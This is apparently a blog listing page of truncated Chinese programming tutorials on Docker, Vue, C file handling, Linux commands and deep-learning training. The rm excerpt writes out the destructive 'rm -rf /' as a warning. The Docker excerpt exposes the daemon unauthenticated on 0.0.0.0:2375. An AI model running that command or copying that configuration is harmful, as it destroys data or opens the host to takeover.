#从pyplot导入MultipleLocator类，这个类用于设置刻度间隔 from matplotlib.pyplot import MultipleLocator #ax为两条坐标轴的实例 ax=plt.gca() #把x轴的刻度间隔设置为1，把y轴的刻度间隔设置为10 x_major_locator=MultipleLocator(1) y_major_locator=MultipleLocator(10) ax.xaxis.set_major_locator(x_major_locator) ax.yaxis.set_major_locator(y_major_locator) # 把x轴的刻度范围设置为-0.5到11; 把y轴的刻度范围设置为-5到110 plt.xlim(-0.5,11) plt.ylim(-5,110) （3）调整字体大小
ax=plt.gca() '''设置刻度字体大小（fontsize）, 字体样式（fontname），加粗（weight）''' plt.xticks(fontsize=20,fontname='Times New Roman',weight = 'bold') plt.yticks(fontsize=20,fontname='Times New Roman',weight = 'bold') '''设置坐标标签字体大小（fontsize）, 字体样式（fontname），加粗（weight）''' ax.set_xlabel(..., fontsize=20,fontname='Times New Roman',weight = 'bold') ax.set_ylabel(..., fontsize=20,fontname='Times New Roman',weight = 'bold') '''设置图例字体大小（fontsize）, 字体样式（fontname），加粗（weight）''' ax.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8b5c6a6b6cc365a762e04de6cdff03f4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c99956c44cec14c72f0e63133f64c760/" rel="bookmark">
			IDEA整合Docker，一键打包服务镜像与启动容器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		尝试了IDEA整合Docker，坑有些多，但经过查阅资料都一一解决了，写了个案例，感觉这种方式确实要方便很多。下面来整理下步骤：
一、安装Docker 准备一台Linux，我这里用的是centos 7 mini 版，然后安装Docker
安装Device Mapper：
yum install -y yum-utils device-mapper-persistent-data lvm2 配置Docker的yum源：
yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 更新yum缓存
yum makecache fast 安装Docker-ce
yum -y install docker-ce 等待上述加载完，然后启动Docker
systemctl start docker 校验Docker是否安装成功
docker -v 如果能输出版本号等信息，说明Docker安装OK，如下：
[root@localhost ~]# docker -v Docker version 20.10.22, build 3a2c30b 二、开启Docker的远程访问 修改服务文件：/lib/systemd/system/docker.service
新增一行：ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock
ps：注意间隔，别写错了（我这步就是因为-H跟前面的写一块了，结果报了一堆奇怪的问题，(⊙o⊙)…
重新加载配置文件
systemctl daemon-reload 重启服务
systemctl restart docker 内部检验：curl http://127.0.0.1:2375/info
外部访问（浏览器访问你Linux的IP+2375/info）
能访问到如上信息，说明外部访问也是OK的
ps：如果你访问不到，注意检查下2375端口是否开放，我这里安装了宝塔面板，可以方便在安全里添加开放端口的规则，当然你不装这个也行，用命令行也是可以操作的呢。
三、在IDEA整合Docker 先安装个插件Docker（在插件市场里面可以找到）
配置连接远程Docker信息
信息填写完整，下方出现connection successful说明连接成功！
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c99956c44cec14c72f0e63133f64c760/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f2699ae6ec94b91cf22fa58b90b8bd8/" rel="bookmark">
			语义分割——FCN模型pytorch实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		FCN网络简介 全卷积网络（Fully Convolutional Networks，FCN）是Jonathan Long等人于2015年在Fully Convolutional Networks for Semantic Segmentation一文中提出的用于图像语义分割的一种框架，是首个端对端的针对像素级预测的全卷积网络。FCN将传统CNN后面的全连接层换成了卷积层，这样网络的输出将是热力图而非类别；同时，为解决卷积和池化导致图像尺寸的变小，使用上采样方式对图像尺寸进行恢复。
网络结构 FCN网络结构主要分为两个部分：全卷积部分和反卷积部分。其中全卷积部分为一些经典的CNN网络（如VGG，ResNet等），用于提取特征；反卷积部分则是通过上采样得到原尺寸的语义分割图像。FCN的输入可以为任意尺寸的彩色图像，输出与输入尺寸相同，通道数为n（目标类别数）+1（背景），（原始FCN是在PASCAL数据集上训练的所以一共有20+1类）。FCN-8s网络结构如下：
21张概率图中每个像素处是一个概率，表明当前像素属于哪一种类别
这里为什么会产生568*568大小的图片呢，是因为原论文的源码中在第一个卷积层处将padding设置为100，这样做的目的是防止图片下采样32倍后尺寸小于7x7（因为下采样32倍后会经过7x7大小的卷积层），之后上采样32倍后会产生与原图不一样大小的图片，需要进行裁剪才能得到原图大小的输出。
PS：卷积向下取整，池化向上取整
官方模型是采用了VGG16作为backbone
VGG16网络结果如下图所示：
其中最大池化层为2x2 步长为2
论文中提出了三个模型分别是FCN-32s、FCN-16s、FCN-8s。
FCN-32s pool5的输出直接上采样32倍恢复到原图大小，将损失了原图很多细节信息的特征图直接上采样，效果较差
现在的FCN的源码中FC6的卷积层的padding为3，这样可以使输出的图片高宽不变，防止输入图片过小导致该卷积层报错，例如若没有该padding，那么输入192x192的图片FC6的输入会是6x6大小的图片，FC6就报错了。
论文源码中的转置卷积的参数是冻结的，因为作者发现冻结和不冻结的结果相差不大，为了提高效率，所以就冻结了。此时转置卷积层相当于是双线性插值。这里效果不明显的原因是上采样倍数太大了
FCN-16s
pool5的输出上采样2倍（采样后大小与pool4的输出相同）然后与pool4输出相加然后再直接上采样16倍恢复到原图大小
FCN-8s pool5的输出上采样2倍（采样后大小与pool4的输出相同）然后与pool4输出相加然后再上采样2倍（采样后大小与pool3的输出相同），然后与pool3输出相加然后再直接上采样8倍恢复到原图大小。
转置卷积计算公式：
o'为卷积输出大小，i‘为卷积输入大小，s为卷积核stride，k为卷积核大小，p为填充
实现FCN-8s时的参数如下
参数名称参数值f6.stride1f6.padding3f7.stride1f7.padding1转置卷积1.padding1转置卷积1.stride2转置卷积2.padding1转置卷积2.stride2转置卷积3.padding4转置卷积3.stride8 规律：设倍率为x，当转置卷积的2*padding -x = k.size、 s为上采样倍率x时恰好可以上采样 原论文中FCN-32s、16s、8s中效果比较
Pytorch实现FCN-8s 网络结构 数据处理 数据集 数据集采用的是PASCAL VOC2012数据集
root样例 root = 'F:\VOCtrainval_11-May-2012\VOCdevkit\VOC2012' 到VOC2012
class VOC_Segmentation(Dataset): def __init__(self,root,text_name='train.txt',trans=None): super(VOC_Segmentation, self).__init__() #数据划分信息路径 txt_path = os.path.join(root,'ImageSets','Segmentation',text_name) #图片路径 image_path = os.path.join(root,'JPEGImages') #mask(label)路径 mask_path = os.path.join(root,'SegmentationClass') #读入数据集文件名称 with open(txt_path,'r') as f: file_names = [name.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5f2699ae6ec94b91cf22fa58b90b8bd8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e3b5650e9e00714702e347d2db6305b7/" rel="bookmark">
			【C语言基础】文件管理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、文件的相关概念二、文件的打开与关闭——fopen与fclose函数1、fopen函数打开文件2、fclose函数关闭文件 三、文件的顺序读写1、向文件读写一个字符——fgetc与fputc函数a、fgetc举例b、fputc举例 2、向文件读写一个字符串——fgets与fputs函数a、fgets举例b、fputs举例 3、对文件进行格式化读写——fprintf与fscanf函数a、举例b、比较(printf,fprintf,sprintf) 4、按二进制方式对文件进行读写——fwrite与fread函数 四、文件的随机读写1、rewind函数2、fseek函数3、ftell函数 五、文件的结束判定——feof函数 由于所用函数较多，提供一个比较好用的网址可查询函数相关知识：
函数查询入口（点击即可进入）
一、文件的相关概念 1、C程序主要有两种文件：程序文件和数据文件
2、输入输出流：输入输出数据传送的过程，C中把此称为流
3、文件名：文件路径+文件名主干+文件后缀
D:\cc\temp\ filel . dat 文件路径 文件名主干 文件后缀 4、文件类型：ASCII文件和二进制文件
5、文件缓冲区：指系统自动地在内存区为每一个正在使用的文件开辟一个文件缓冲区
相当于是磁盘和程序数据区的一个中介
6、文件类型指针——FILE（为结构体，有系统提供）
每一个FILE类型变量对应一个文件信息区，其中包含该文件的有关信息
定义文件型指针变量： FILE* fp;
fp 是一个指向FILE类型变量的指针变量，即：通过fp能够找到与它相关的文件
二、文件的打开与关闭——fopen与fclose函数 1、fopen函数打开文件 一般形式： FILE* fp; //定义文件型指针变量 fp = fopen(文件名,使用文件方式); //使指针变量指向打开的文件的信息区 例如： fp = fopen("test.txt","r"); //绝对路径的写法：fopen("D:\\office\\VS2013\\file\\test.txt","r"); //相对路径的写法：fopen("test.txt","r"); //或者：fopen("..\\test.txt");//此表示上一级路径 //上上级路径：..\\..\\ 常用打开文件的方法： if ((fp = fopen("test.txt","r")) == NULL){ //打开失败，fopen 函数会返回一个空指针NULL printf("文件打开失败!\n"); //可用printf("%s\n",strerror(errno));输出出错原因 //需引头文件 &lt;string.h&gt; 与 &lt;errno.h&gt; exit(0); //exit为终止的库函数，需引头文件 &lt;stdlib.h&gt; } 对文件访问的方式 文件访问方式含义文件不存在时"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e3b5650e9e00714702e347d2db6305b7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f79cf8ef05622d029fa34a2899240a22/" rel="bookmark">
			Vue知识系列-VS Code的安装&#43;Vue环境的搭建&#43;Vue指令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、VS Code下载地址 Visual Studio Code - Code Editing. Redefined
二、VS Code初始化设置 1.安装插件 在安装好的VSCode软件的扩展菜单中查找安装如下4个插件
2、创建项目 vscode本身没有新建项目的选项，所以要先创建一个空的文件夹，如project_xxxx。
然后打开vscode，再在vscode里面选择 File -&gt; Open Folder 打开文件夹，这样才可以创建项目。
3、保存工作区 打开文件夹后，选择“文件 -&gt; 将工作区另存为...”，为工作区文件起一个名字，存储在刚才的文件夹下即可。
4.在工作区下可以创建文件夹和文件 如创建vuedemo文件夹
5. 在文件夹中创建html文件 在vuedemo文件夹创建"vue入门.html"文件,在空白文件中可使用快捷方式(输入英文 ! )生成html模板。
三、Vue构建页面前端框架 1. 构建页面前端框架的步骤 步骤一： 创建html页面，使用vscode快捷键(英文 ! )生成html代码
步骤二：在body中使用&lt;script&gt;标签引入vue的js文件
&lt;body&gt; &lt;!--根据vue.js的实际路径引入 --&gt; &lt;script src="../plugins/vue/vue.min.js"&gt;&lt;/script&gt; &lt;/body&gt; 步骤三：在html页面的body中创建div标签，div添加id属性。主要是为了指定内容显示的地方。
&lt;div id="app"&gt;&lt;/div&gt; 步骤四：在body的&lt;script&gt;标签中，创建一个vue对象。固定的结构
&lt;script&gt; //创建一个Vue对象 new Vue({ el:'#app',//绑定vue作用的范围，#app表示引用div的id data:{ //定义页面中显示的模型数据 message:'Hello Vue!' } }) &lt;/script&gt; 步骤五：使用差值表达式获取data里面定义值：{{}}
&lt;div id="app"&gt;{{message}}&lt;/div&gt; Vue前端框架
&lt;body&gt; &lt;script src="../plugins/vue/vue.min.js"&gt;&lt;/script&gt; &lt;div id="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f79cf8ef05622d029fa34a2899240a22/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2c856d51ddca0e9c026f567dfdcd37c/" rel="bookmark">
			rm——删除文件、文件夹
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		rm——删除文件、文件夹 1、作用 rm命令来自英文单词：remove
可用于删除文件、文件夹
2、语法 rm [-r -f] 参数1 参数2 …… 参数N
-r选项，可选，用于删除文件夹-f选项，可选 ，表示force，强制删除（不会弹出提示确认信息） 普通用户删除内容不会弹出提示，只有root管理员用户删除内容会有提示所以一般普通用户用不到-f选项 参数1、参数2、……、参数N表示要删除的文件或文件夹路径，按照空格隔开 3、通配符* rm命令支持通配符*，用来做模糊匹配。
符号*表示通配符，即匹配任意内容（包含空） 示例：
test*，表示匹配任何以test开头的内容*test，表示匹配任何以test结尾的内容*test*，表示匹配任何包含test的内容 演示：
4、强制删除，-f选项 切换至root用户（超级管理员）
su - root，输入密码，临时切换到root用户体验
退回普通用户
通过输入exit命令
注意：
rm是一个危险的命令，特别是在处于root（超级管理员）用户的时候。请谨慎使用。
如下命令，请千万千万不要在root管理员用户下执行：
rm -rf /rm -rf /* 效果等同于在Windows上执行C盘格式化。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/69b711233e3ed0c387498154ba00490a/" rel="bookmark">
			CentOS 8修改系统语言为中文
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 查看系统当前所用的字符集
locale 查看系统当前安装的所有字符集中有没有 zh_CN.utf8 字符集
locale -a |grep zh_CN.utf8 假如没有，则需要安装中文字符集
yum install -y langpacks-zh_CN 修改配置文件：/etc/profile.d/lang.sh
vim /etc/profile.d/lang.sh 在41行处修改为 LANG=zh_CN.UTF-8
重启电脑
sudo reboot 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a92049e86a6d369cb5993f97522bc22f/" rel="bookmark">
			Docker（黑马spring cloud笔记）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Docker 目录 Docker一、介绍和安装1. 安装2. 启动3. 镜像加速 二、Docker基本操作1. 镜像操作2. 容器操作3. 数据卷操作 三、Dockerfile1. 镜像结构2. Dockerfile 四、Docker-Compose1. 安装2. 基本命令 五、Docker私服搭建六、练习练习1：save和load练习2：docker部署nginx问题：修改主页 练习3：部署MySQL练习4：基于Ubuntu构建一个新镜像，运行一个java项目问题 层数太多，每次都要安装jdk 练习5：部署微服务集群问题：微服务注册失败 一、介绍和安装 Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。
Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。
容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。
几个概念：
镜像（image）：Docker将应用程序及其所需要的依赖、函数库等打包在一起，即为镜像。容器：镜像中的应用程序运行后形成的进程。Docker Registry：镜像托管平台，如DockerHub，网易云镜像服务，阿里云镜像服务。 docker架构：
1. 安装 可以先选择卸载：
yum remove docker \ docker-client \ docker-client-latest \ docker-common \ docker-latest \ docker-latest-logrotate \ docker-logrotate \ docker-selinux \ docker-engine-selinux \ docker-engine \ docker-ce 安装存储驱动等：
yum install -y yum-utils \ device-mapper-persistent-data \ lvm2 --skip-broken 设置docker仓库：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a92049e86a6d369cb5993f97522bc22f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae84d5139c17f442e06701bd5fd351b9/" rel="bookmark">
			若依框架自动生成功能使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 创建数据库表 leaseholder DROP TABLE IF EXISTS `leaseholder`; CREATE TABLE `leaseholder` ( `internal_key` int(11) NOT NULL AUTO_INCREMENT COMMENT '单元租户信息登记簿', `address` char(255) DEFAULT NULL, `user_name` char(255) DEFAULT NULL COMMENT '租户信息登记簿', PRIMARY KEY (`internal_key`) ) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8; 创建完成后找到系统工具-------&gt;代码生成-------&gt;导入创建的数据库表信息 导入成功后点击修改，修改表基本信息、字段信息和生成信息，上述信息填写完成后点击提交 选中导入的表信息，带年纪生成代码即可生成压缩包文件 解压完成后目录机构如下图，包含一个java的main文件夹，一份数据库sql文件，一份前端vue文件
返回idea,新建一个leaseHolder模块 将解压后的main文件复制到leaseHolder模块的src目录下，完成后目录结构如下 打开生成的vue文件夹，将api文件和views文件复制到ruoyi-ui 模块的src目录下，复制完成后api和views文件夹下就有了生成的代码 在ruoyi-admin模块的pom文件中引入新建的leaseHolder模块依赖 打开数据库新建查询载入生成的sql文件运行 运行成功后，前端目录结构发生改变，测试菜单下有了leaseHolderInfo目录，可做增删改查操作 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba9684dfd2d4e65c31c9f5ea55a4159f/" rel="bookmark">
			使用Swin-Transformer进行CIFAR100数据集的训练
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		论文下载地址：https://arxiv.org/pdf/2103.14030.pdf
论文知识点讲解：https://blog.csdn.net/zhe470719/article/details/123395256?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-123395256-blog-125203199.pc_relevant_3mothn_strategy_and_data_recovery&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-123395256-blog-125203199.pc_relevant_3mothn_strategy_and_data_recovery&amp;utm_relevant_index=1
使用Swin-Transformer进行CIFAR-10数据集进行测试，这里使用的是将CIFAR-100数据集的分辨率扩大到32X32，因为算力相关的问题所以我选择了较低的训练图像分辨率。但是假如你自己的算力比较充足的话，我建议使用训练的使用图像的分辨率设置为224X224（这个可以在代码里面的transforms.RandomResizedCrop(32)和transforms.Resize((32, 32)),进行修改，很简单），因为在测试训练的时候，发现将CIFAR10数据集的分辨率拉大可以让模型更快地进行收敛，并且识别的效果也是比低分辨率的更加好。
如果对你有用的话，希望能够点赞支持一下，这样我就能有更多的动力更新更多的学习笔记了。😄😄
代码结构的目录：
train.py
# -*- coding:utf-8 -*- # @Time : 2023-01-16 16:26 # @Author : DaFuChen # @File : CSDN写作代码笔记 # @software: PyCharm import torchvision import os import parameters import function import torch import torch.nn as nn import torch.optim as optim from torchvision import transforms from tqdm import tqdm from model import swin_tiny_patch4_window7_224 as create_model def main(): device = torch.device("cuda:0" if torch.cuda.is_available() else "cpu") print("using {} device.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ba9684dfd2d4e65c31c9f5ea55a4159f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/263df1776028c618a16b115a535b45aa/" rel="bookmark">
			Python太烂了！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原因1：版本之间不兼容
安装Linux后，那么它很可能默认会安装多个版本的Python，可能有Python2和Python3，甚至更多零零碎碎的版本，如3.5或3.7。
这是有原因的：Python3与Python2不完全兼容，一些其他版本在这方面的缺陷也足够明显——向后兼容性不足（backwards compatibility，也称为向下兼容性）。
所以Ubuntu同时安装了Python2和Python3，因为这些版本的核心功能是不同的。
缺乏向后兼容和分离版本通常是走向衰败的预警。Commodore创建了第一台家用电脑（要远早于IBM PC或Apple之前）。但Commodore PET与随后的Commodore CBM计算机并不兼容，而CBM与VIC-20，Commodore-64，Amiga等也不兼容。因此，用户要么花费大量时间将代码从一个平台导到另一个平台，要么就直接放弃了这个平台——Commodore就是前车之鉴。当用户选择放弃平台时，它就注定会消失。
同样，Perl曾经很受欢迎。但是当Perl3问世时，它并没有完全向后兼容Perl2的代码。接下来是Perl4。当Perl5问世时，很多人选择转向使用其他更稳定的编程语言。所以今天，只有一小部分人还在积极使用Perl来维护现有的Perl项目，而其他任何基于Perl的重大新项目再也没有出现过。
同样，Python为每个版本设计了不同的代码孤岛。社区一直拖拽着这些旧版本，所以你最终也只能得到那些旧的、过时的Python代码，因为没有人愿意花时间将它导到最新版本上。
据我所知，没有人在Python2上创建新的代码，但我们还让它苟延残喘着，因为没人将所需的代码导到Python3.x. 在官方Python网站上，这些文档被主动维护并可用于Python 2.7、3.5、3.6和3.7——因为他们无法放弃旧代码。Python就像编程语言的僵尸——行尸走肉般向前走。
原因2：安装太太太太麻烦了
通常来说，你直接apt、yum、rpm后得到就是最新稳定版。
但你如果'apt-get install python'，就不知道是什么版本，可能与你需要的所有代码都不兼容。所以你在安装的时候需要指定Python版本。
有一个项目需要用Python3.5（当时最新的版本），然而我的电脑上最终安装了一大堆版本：Python2、Python2.6、Python3和Python3.5。两个来自操作系统，一个为了项目安装，一个是因为我安装了一些不相关的软件。
尽管它们都是“Python”，但它们并非完全相同。
如果你想安装Python的软件包，你应该使用“pip”（Pip代表“Pip Installs Packages”）。但是由于系统上有许多版本的Python，你必须记住使用正确版本的pip。否则，'pip'可能会运行'pip2'而不是你需要的'pip3.7'。（如果名称不存在，你需要指定pip3.7的实际安装路径。）
我被一个朋友告知我需要配置环境，以便所有东西都能使用Python 3.5。这种方法的确很有效，但没有持续多久，因为我开始了另一个需要Python 3.6版本的项目。两个并发项目有两个不同版本的Python——emmmm，这有点一言难尽吧。
pip安装程序将文件放在用户的本地目录中。你不能使用pip来安装系统范围的库，并且Gawd会阻止你犯下运行'sudo pip'的错误，因为这会搞砸整个电脑！
顺便说一句，是谁维护这些pip模块？答案是社区。也就是说，没有明确的所有者，也没有强制性的责任所属。今年早些时候，一个版本的PyPi有一个后门发生了SSH凭据盗窃，但我对此一点都不惊讶，因为社区存储库根本不值得相信。出于同样的原因，我也不使用Node.js和npm。
原因3：令人头疼的语法问题，作用域使用空格导致可读性差
我是可读代码的坚定信徒。乍一看，Python似乎非常易读，而当你开始制作大型代码库，这种易读性就会减弱了。
其他编程语言，像C, Java, JavaScript, Perl, and PHP，用{} 来表示作用域；List用()。Python用空格。如果你需要给一个复杂的代码定义一个作用域，然后你缩进了下面几行代码，当缩进终止后，作用域就终止了。
Python手册说你可以使用任意数量的空格或制表符来定义范围。但是，每次缩进都要用四个空格！如果要缩进两次以进行嵌套，那就得使用八个空格！
Python社区已经对这个术语进行标准化，尽管它没出现在Python手册中。文档中的示例说可以使用TAB、“TAB+1空格”等等。但是社区却对4个空格有着丧心病狂的偏执！因此，除非你打算永远不向其他任何人展示你写的代码，否则每个缩进都要使用四个空格。
当我第一次看到Python代码时，我认为使用缩进来定义范围似乎是个好主意。事实上，我太天真了，这简直是一个天大的缺点。
深度嵌套是可以进行的，但每行代码会变得很宽，不得不在文本编辑器中换行。长函数和长条件操作都可能让开始与结束变得难以匹配。我可怜那些错误计算空格数量（比如只输了3个空格而不是四个）的人，因为这样的错误需要数小时进行调试和追踪。
我debug代码习惯没有缩进，这样我就可以快速浏览代码，并在完成后轻松识别和删除debug代码。
但是用Python呢？缩进错误的话，都会报错。
原因4：特立独行的加载库方式
大多数编程语言都有一些方法可以包含其他代码块。对于C，它是“#include”。对于PHP，有'include'，'include_once'，'require'和'require_once'。而对于Python，则是“import”。
Python的import允许导入整个模块、模块的一部分或模块中的特定功能。但查找导入代码块的方法却很麻烦。使用C，直接看/usr/include/*.h就行了。但用Python？最好使用'python -v'列出所有位置，然后搜索该列表中每个目录和子目录中的每个文件。这真的很麻烦。
导入功能还允许用户重命名导入的代码，它们基本上定义了一个命名空间。乍一看，这似乎很不错，但这最终会影响可读性和长期支持。重命名模块非常适合小脚本，但对于大程序来说真的很糟糕。这样的操作“import numpy as n”，应该被打死。
但这不是最糟糕的部分。对于大多数语言，包含代码真的只意味着包含代码。而一些语言（如面向对象的C ++）则可以执行代码。类似地，一些PHP代码可能会定义全局变量，因此一项import可以运行代码，但这通常被认为是一种不好的做法。相比之下，许多Python模块包含在导入期间运行的初始化函数。你不知道什么在运行，你不知道它在做什么，你甚至都没察觉到。除非存在命名空间冲突，否则在这种情况下，你需要花很长时间来查找原因。
原因5：关键字和库命名“独树一帜”
在其他所有编程语言中，数组都称为“array”。在Python中，数组被称为“list”。在其他语言中，关联数组有时称为'hash'（Perl），但Python里叫做“dictionary”。 Python似乎没有使用在计算机和信息科学领域的常用术语。
然后是库的名称。看看这些名字吧，PyPy、PyPi、NumPy、SciPy，SymPy、PyGtk、Pyglet，PyGame ...（是的，前两个名称发音一模一样，但是它们的功能和用途有很大区别。）我知道“py”代表Python。但这两个字母就不能固定在库的开头或是末尾吗？
而且一些常见的库并没有沿用这个所谓的“Py”命名约定。比如matplotlib、nose、Pillow和SQLAlchemy。虽然从一些命名上能够看出库的一些功能（比如“SQLAlchemy”包含SQL，所以它可能是一个SQL接口），但很多名称只是随机化的单词。如果你事先并不知道“BeautifulSoup”是干什么用的，你能从名称中看出它是一个HTML / XML解析器吗？（顺便说一句，BeautifulSoup库的说明文档很完备，非常易于使用。如果每个Python模块都这么好用，我也不会在这里吐槽这么多。但遗憾的是，这只是个例外，而不是常态。大多数Python库的文档都烂的要死。）
总的来说，我认为Python对库的命名非常混乱，缺乏一致性的原则。我总觉得，开源项目的命名都存在这种规则混乱的问题。除非你了解这个项目，否则你从项目名字上根本看不出来。除非你知道要找的是什么，否则你很可能永远都无法找到想找的东西。从大多数Python库的命名上看，我现在更加确信这个观点了。
原因6：其他“独树一帜”之处略多
每种语言都有它的怪癖。在C语言中，使用＆和*来访问地址空间和值是奇怪的命名法。C也有“++”和 --"这样的变量增减控制方式。在Bash语言中，当引用括号和正则表达式的句点等特殊字符时，需要使用反斜杠。
JavaScript存在兼容性问题（并非每个浏览器都支持所有有用的功能）。但是，Python比我见过的任何其他语言的奇怪之处更多。以字符串为例：
•在C中，对字符串使用双引号，对字符使用单引号。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/263df1776028c618a16b115a535b45aa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6beb452b6b98bdf9fa051bc3591f2256/" rel="bookmark">
			使用Swin-Transformer进行CIFAR10数据集的训练
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		论文下载地址：https://arxiv.org/pdf/2103.14030.pdf
论文知识点讲解：https://blog.csdn.net/zhe470719/article/details/123395256?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-123395256-blog-125203199.pc_relevant_3mothn_strategy_and_data_recovery&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-123395256-blog-125203199.pc_relevant_3mothn_strategy_and_data_recovery&amp;utm_relevant_index=1
使用Swin-Transformer进行CIFAR-10数据集进行测试，这里使用的是将CIFAR-10数据集的分辨率扩大到32X32，因为算力相关的问题所以我选择了较低的训练图像分辨率。但是假如你自己的算力比较充足的话，我建议使用训练的使用图像的分辨率设置为224X224（这个可以在代码里面的transforms.RandomResizedCrop(32)和transforms.Resize((32, 32)),进行修改，很简单），因为在测试训练的时候，发现将CIFAR10数据集的分辨率拉大可以让模型更快地进行收敛，并且识别的效果也是比低分辨率的更加好。
如果对你有用的话，希望能够点赞支持一下，这样我就能有更多的动力更新更多的学习笔记了。😄😄 代码结构的目录：
train.py
# -*- coding:utf-8 -*- # @Time : 2023-01-16 16:26 # @Author : DaFuChen # @File : CSDN写作代码笔记 # @software: PyCharm import torchvision import os import parameters import function import torch import torch.nn as nn import torch.optim as optim from torchvision import transforms from tqdm import tqdm from model import swin_tiny_patch4_window7_224 as create_model def main(): device = torch.device("cuda:0" if torch.cuda.is_available() else "cpu") print("using {} device.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6beb452b6b98bdf9fa051bc3591f2256/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/59437e22d8a73667fafded1e9965ae8b/" rel="bookmark">
			Java刷算法之背包问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背包问题 01背包问题1.题目3.测试样例3.思想4.代码 完全背包问题1.题目 3.测试样例4.思想4.代码 分组背包问题1.题目2.测试样例3.思想4.代码 01背包问题 1.题目 有 N 件物品和一个容量是 V 的背包。每件物品只能使用一次。第 i 件物品的体积是 v i v_i vi​，价值是 w i w_i wi​。求解将哪些物品装入背包，可使这些物品的总体积不超过背包容量，且总价值最大。输出最大价值。
输入格式
第一行两个整数，N，V，用空格隔开，分别表示物品数量和背包容积。接下来有 N 行，每行两个整数 v i , w i v_{i},w_i vi​,wi​，用空格隔开，分别表示第 i 件物品的体积和价值。
输出格式
输出一个整数，表示最大价值。
3.测试样例 输入样例 4 5 1 2 2 4 3 4 4 5 输出样例： 8 3.思想 4.代码 import java.util.Scanner; public class 背包问题01 { //d[i][j]:前i件物品且总体积不大于j的最大价值 public static void main(String []args){ final int maxn=1005; Scanner input=new Scanner(System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/59437e22d8a73667fafded1e9965ae8b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8986dd0b9da5e3b1aea923fa70719323/" rel="bookmark">
			使用EfficientNet进行CIFAR100训练
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		论文下载地址：https://arxiv.org/pdf/1905.11946.pdf
具体模型细节知识点：EfficientNet模型的完整细节_喜欢打酱油的老鸟的博客-CSDN博客
